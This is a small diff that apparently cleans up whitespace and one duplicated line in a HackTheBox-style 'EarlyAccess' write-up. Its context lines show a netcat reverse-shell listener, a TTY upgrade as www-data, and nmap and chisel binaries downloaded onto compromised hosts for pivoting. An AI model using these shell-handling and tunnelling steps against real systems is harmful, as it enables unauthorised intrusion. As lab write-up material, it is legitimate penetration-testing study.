@@ -501,7 +501,6 @@ script /dev/null -c bash
 Script started, file is /dev/null
 www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
 zsh: suspended  nc -nlvp 9999
-zsh: suspended  nc -nlvp 9999
 p3ntest1ng:~$ stty raw -echo; fg
 [1]  + continued  nc -nlvp 9999
                                reset xterm
@@ -767,7 +766,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 5944464 (5.7M) [application/octet-stream]
 Saving to: ‘nmap’
 
-nmap 100%[=====================================>]   5.67M  2.23MB/s    in 2.5s    
+nmap 100%[=====================================>]   5.67M  2.23MB/s    in 2.5s
 
 2022-02-13 02:43:19 (2.23 MB/s) - ‘nmap’ saved [5944464/5944464]
 
@@ -843,7 +842,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 5944464 (5.7M) [application/octet-stream]
 Saving to: 'nmap'
 
-nmap 100%[=====================================>]   5.67M  1.29MB/s    in 5.9s    
+nmap 100%[=====================================>]   5.67M  1.29MB/s    in 5.9s
 
 2022-02-13 02:07:14 (984 KB/s) - 'nmap' saved [5944464/5944464]
 
@@ -899,7 +898,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 8077312 (7.7M) [application/octet-stream]
 Saving to: 'chisel'
 
-chisel 100%[=====================================>]   7.70M  2.15MB/s    in 3.7s    
+chisel 100%[=====================================>]   7.70M  2.15MB/s    in 3.7s
 
 2022-02-13 02:37:35 (2.06 MB/s) - 'chisel' saved [8077312/8077312]
 game-tester@game-server:/tmp/wildzarek$ chmod +x chisel
